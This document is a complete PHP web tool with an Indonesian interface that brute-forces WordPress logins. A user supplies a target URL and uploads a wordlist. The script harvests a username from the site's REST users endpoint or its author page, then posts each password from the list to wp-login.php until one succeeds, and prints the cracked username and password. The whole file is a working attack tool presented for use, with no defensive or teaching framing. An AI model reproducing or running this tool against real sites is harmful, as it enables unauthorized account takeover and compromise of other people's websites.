<?php
function getUsernameFromTarget($url) {
    $json = @file_get_contents(rtrim($url, '/') . '/wp-json/wp/v2/users');
    $users = @json_decode($json, true);
    if (!empty($users[0]['slug'])) {
        return $users[0]['slug'];
    }

    $check = @file_get_contents(rtrim($url, '/') . '/?author=1');
    if (preg_match('/<title>(.*?)</', $check, $match)) {
        return strtolower(trim(strip_tags($match[1])));
    }

    return false;
}

function tryLogin($url, $username, $password) {
    $loginUrl = rtrim($url, '/') . '/wp-login.php';
    $data = http_build_query([
        'log' => $username,
        'pwd' => $password,
        'wp-submit' => 'Log In',
        'redirect_to' => rtrim($url, '/') . '/wp-admin/',
        'testcookie' => '1'
    ]);
    $opts = [
        'http' => [
            'method' => "POST",
            'header' =>
                "Content-type: application/x-www-form-urlencoded\r\n" .
                "Content-Length: " . strlen($data) . "\r\n",
            'content' => $data
        ]
    ];
    $context = stream_context_create($opts);
    $response = @file_get_contents($loginUrl, false, $context);

    if ($response && isset($http_response_header[0]) && strpos($http_response_header[0], "302") !== false && strpos($response, 'dashboard') !== false) {
        return true;
    }
    return false;
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>WPBF - Brute Force with Custom Wordlist</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
  <style>
    body { background-color: #111; color: #eee; font-family: monospace; }
    .container { max-width: 700px; padding-top: 60px; }
  </style>
</head>
<body>
<div class="container">
  <h3 class="mb-4"><i class="bi bi-upload text-info"></i> WPBF - Custom Brute Force Tool</h3>
  <form method="POST" enctype="multipart/form-data">
    <div class="mb-3">
      <label class="form-label">Target URL:</label>
      <input type="url" name="target" class="form-control" placeholder="https://example.com" required>
    </div>
    <div class="mb-3">
      <label class="form-label">Upload Wordlist (.txt):</label>
      <input type="file" name="wordlist" class="form-control" accept=".txt" required>
    </div>
    <button type="submit" class="btn btn-danger">Mulai Brute Force</button>
  </form>

  <div class="mt-4">
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['wordlist']) && isset($_POST['target'])) {
    $target = $_POST['target'];
    $tmp = $_FILES['wordlist']['tmp_name'];
    $ext = pathinfo($_FILES['wordlist']['name'], PATHINFO_EXTENSION);

    if ($ext !== 'txt') {
        echo "<div class='text-danger'>File harus berekstensi .txt</div>";
        exit;
    }

    $list = @file($tmp, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (!$list || count($list) < 1) {
        echo "<div class='text-danger'>Wordlist kosong atau tidak bisa dibaca</div>";
        exit;
    }

    $username = getUsernameFromTarget($target);
    if (!$username) {
        echo "<span class='text-danger'>Username tidak ditemukan</span>";
    } else {
        echo "<div class='text-success'>Username ditemukan: <strong>$username</strong><br>Brute force login WordPress...</div>";

        foreach ($list as $pass) {
            $pass = trim($pass);
            if (tryLogin($target, $username, $pass)) {
                echo "<div class='text-success mt-2'>✅ Password ditemukan: <strong>$username:$pass</strong></div>";
                break;
            } else {
                echo "<div class='text-muted'>Mencoba: $username:$pass ... gagal</div>";
            }
            @ob_flush(); @flush();
        }
    }
}
?>
  </div>
</div>
</body>
</html>